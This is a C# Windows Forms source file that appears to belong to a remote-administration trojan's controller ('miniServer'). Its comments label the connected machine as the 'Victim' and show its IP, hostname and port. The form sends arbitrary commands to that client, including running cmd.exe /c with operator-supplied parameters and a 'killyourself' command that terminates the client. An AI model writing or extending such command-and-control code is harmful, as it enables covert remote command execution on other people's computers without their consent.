using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace miniServer
{
    public partial class InteractForm : Form
    {
        public miniClient mc;
        public String separator;

        public InteractForm(miniClient client, String separator)
        {
            InitializeComponent();
            mc = client;
            this.separator = separator;
        }

        private void InteractForm_Load(object sender, EventArgs e)
        {
            mc.Interact    = true;
            labelID.Text   = "HostName: " + mc.ID.ToString();   // ID
            labelIP.Text   = "IP: " + mc.IP;  // Victim IP and Port
            labelHost.Text = "HostName: " +  mc.HostName;   // Victim HostName
            labelPort.Text = "Client port: " + mc.Port; // victim port
  
        }
        private void SendCommand(string command)
        {
            
            Thread thread = new Thread(() => sendToClientCommand(command));
            thread.IsBackground = true;
            thread.Start();

        }
        private void sendToClientCommand(string command)
        {
            try
            {
                //Write command
                mc.SendToClient(command);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error in sending command to client", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            //send a command to check connection status
            if (command == "killyourself")
            {
                Thread.Sleep(1000);
                try
                {
                    mc.SendToClient("version");
                }
                catch
                {
                    if (MessageBox.Show("Client killed successfully.\n" + "Close this window?", "Client Killed!", MessageBoxButtons.YesNo, MessageBoxIcon.Information) == DialogResult.Yes)
                        this.Invoke((MethodInvoker)delegate
                        {
                            this.Close();
                        });
                }
            }

        }

        private void ButtonRun_Click(object sender, EventArgs e)
        {
            if (comboBoxRun.Text == "")
                return;

            if (!comboBoxRun.Items.Contains(comboBoxRun.Text))
                comboBoxRun.Items.Add(comboBoxRun.Text);
            if (!comboBoxParameters.Items.Contains(comboBoxParameters.Text))
                comboBoxParameters.Items.Add(comboBoxParameters.Text);

            string run = comboBoxRun.Text.ToLower();
            if (run == "cmd.exe" || run == "cmd")
                SendCommand("run" + separator + comboBoxRun.Text +  separator + "/c " + comboBoxParameters.Text);
            else
                SendCommand("run" + separator + comboBoxRun.Text + separator + comboBoxParameters.Text);
                
        }

        private void InteractForm_FormClosed(object sender, FormClosedEventArgs e)
        {
            mc.Interact = false;
        }
    }
}
